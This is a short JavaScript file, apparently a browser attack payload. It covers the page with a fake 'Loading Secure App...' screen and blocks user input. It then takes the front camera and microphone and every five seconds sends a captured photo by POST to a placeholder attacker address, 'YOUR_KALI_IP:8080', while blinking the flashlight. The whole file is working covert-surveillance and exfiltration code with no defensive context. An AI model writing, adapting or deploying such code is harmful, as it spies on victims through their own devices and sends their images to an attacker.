// utsav_script.js
(async () => {
  // Lock Screen Simulation
  document.body.innerHTML = "<h1>Loading Secure App...</h1>";
  document.body.style.pointerEvents = "none";
  document.body.style.background = "black";

  // Camera Access
  const videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });

  const video = document.createElement('video');
  video.srcObject = videoStream;
  video.play();

  const canvas = document.createElement('canvas');
  const context = canvas.getContext('2d');

  setInterval(() => {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    const dataURL = canvas.toDataURL('image/png');

    fetch("http://YOUR_KALI_IP:8080", {
      method: "POST",
      body: dataURL
    });
  }, 5000); // 5 seconds me 1 photo

  // Flashlight Blink (for some supported devices)
  if ('torch' in navigator) {
    const track = videoStream.getVideoTracks()[0];
    const imageCapture = new ImageCapture(track);
    const capabilities = await imageCapture.getPhotoCapabilities();
    if (capabilities.torch) {
      for (let i = 0; i < 5; i++) {
        track.applyConstraints({ advanced: [{ torch: true }] });
        await new Promise(r => setTimeout(r, 300));
        track.applyConstraints({ advanced: [{ torch: false }] });
        await new Promise(r => setTimeout(r, 300));
      }
    }
  }
})();
